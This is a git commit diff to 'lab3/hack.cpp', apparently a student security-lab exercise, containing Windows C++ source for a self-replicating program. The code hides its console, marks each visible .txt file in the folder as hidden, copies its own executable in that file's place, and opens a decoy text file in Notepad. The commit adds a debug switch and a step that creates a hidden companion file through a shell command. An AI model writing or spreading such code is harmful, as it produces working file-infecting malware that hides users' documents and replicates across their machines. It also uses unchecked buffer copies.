36f2b85e8fd78e47a81989a3ea801393ed6eee6d
Nicetas Matthias <nicetas.matthias@yandex.ru>
2022-12-22 20:54:39 +0300

    fix lab 3

--- lab3/hack.cpp
+++ lab3/hack.cpp
@@ -4,9 +4,11 @@
 #include <stdlib.h>
 #include <fileapi.h>
 
+const bool debug = false;
+
 int main(int argc, char* argv[])
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	if (!debug) ShowWindow(GetConsoleWindow(), SW_HIDE);
 	WIN32_FIND_DATA FindFileData;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
     char *pch, *pch1;
@@ -18,7 +20,7 @@ int main(int argc, char* argv[])
 	strcpy (myName, argv[0]);
 	
 	//выясняем имя своего txt
-	// printf("my name: %s", myName);
+	if (debug) printf("my name: %s", myName);
 	
 	char *isStr = strtok (myName, ".");
 	if (isStr != NULL)
@@ -27,40 +29,50 @@ int main(int argc, char* argv[])
 		{
 			if (strcat (mytxt, ".txt"))
 			{
-				// printf("found my txt: %s\n", mytxt);
+				if (debug) printf("found my txt: %s\n", mytxt);
 			}
 			else
 			{
-				// printf("strcat error");
+				if (debug) printf("strcat error");
 				return 5;
 			}
 		}
 		else
 		{
-			// printf("strcpy error");
+			if (debug) printf("strcpy error");
 			return 4;
 		}
 			
 	}
 	else
 	{
-		// printf("strtok error");
+		if (debug) printf("strtok error");
 		return 3;
 	}
-	// printf ("Start hacking\n");
+	
+	if (GetFileAttributes(mytxt) == DWORD(-1))
+	{
+		char createTxtCommand[MAX_PATH];
+		strcpy(createTxtCommand, "type nul >");
+		strcat(createTxtCommand, mytxt);
+		system (createTxtCommand);
+		SetFileAttributes (mytxt, FILE_ATTRIBUTE_HIDDEN);
+	}		
+	
+	if (debug) printf ("Start hacking\n");
 	
 	// выясняем текущую директорию
 	if (GetCurrentDirectory (sizeof (path), path))
     {
-        // printf ("found path:%s\n", path);
+        if (debug)  printf ("found path:%s\n", path);
 		strcpy (clearPath, path);
         lstrcat (clearPath, "\\");
         lstrcat (path, "\\*.txt");
-        // printf ("edited path:%s\n", path);
+        if (debug)  printf ("edited path:%s\n", path);
     }
 	else
 	{
-        // printf ("error while recieving path %s\n", GetLastError ());
+        if (debug)  printf ("error while recieving path %s\n", GetLastError ());
 		return 1;
 	}
 		
@@ -68,21 +80,21 @@ int main(int argc, char* argv[])
 	
 	if (hFind == INVALID_HANDLE_VALUE)
     {
-		// printf ("Invalid file handle. Error is %u.\n", GetLastError ());
+		if (debug)  printf ("Invalid file handle. Error is %u.\n", GetLastError ());
 		return 2;
 	}
 	if (strstr (FindFileData.cFileName, mytxt))
 	{
-		// printf ("my txt | ");
+		if (debug) printf ("my txt | ");
 	}
 	if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
 	{
-		// printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
+		if (debug) printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
 	}
 	else
 	{
 		char tmpExeName[MAX_PATH];
-		// printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
+		if (debug)  printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
 		SetFileAttributes (FindFileData.cFileName, FILE_ATTRIBUTE_HIDDEN);
 		isStr = strtok (FindFileData.cFileName, ".");
 		strcpy (tmpExeName, isStr);
@@ -91,7 +103,7 @@ int main(int argc, char* argv[])
 		int res = CopyFile (argv[0], tmpExeName, false);
 		if (res == 0)
 		{
-			// printf ("error while make copy: %d\n", GetLastError ());
+			if (debug) printf ("error while make copy: %d\n", GetLastError ());
 			return 6;
 		}
 	}
@@ -100,16 +112,16 @@ int main(int argc, char* argv[])
 		
 		if (strstr (FindFileData.cFileName, mytxt))
 		{
-			// printf ("my txt | ");
+			if (debug) printf ("my txt | ");
 		}
 		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
 		{
-			// printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
+			if (debug) printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
 		}
 		else
 		{
 			char tmpExeName[MAX_PATH];
-			// printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
+			if (debug) printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
 			SetFileAttributes (FindFileData.cFileName, FILE_ATTRIBUTE_HIDDEN);
 			isStr = strtok (FindFileData.cFileName, ".");
 			strcpy (tmpExeName, isStr);
@@ -118,15 +130,15 @@ int main(int argc, char* argv[])
 			int res = CopyFile (argv[0], tmpExeName, false);
 			if (res == 0)
 			{
-				// printf ("error while make copy: %d\n", GetLastError ());
+				if (debug) printf ("error while make copy: %d\n", GetLastError ());
 				return 6;
 			}
 		}
 	}
-	
+
 	FindClose(hFind);
 	char command[MAX_PATH] = "notepad ";
-	//printf ("%s\n", mytxt);
+	if (debug) printf ("%s\n", mytxt);
 	strcat (command, mytxt);
 	system (command);
 	return 0;
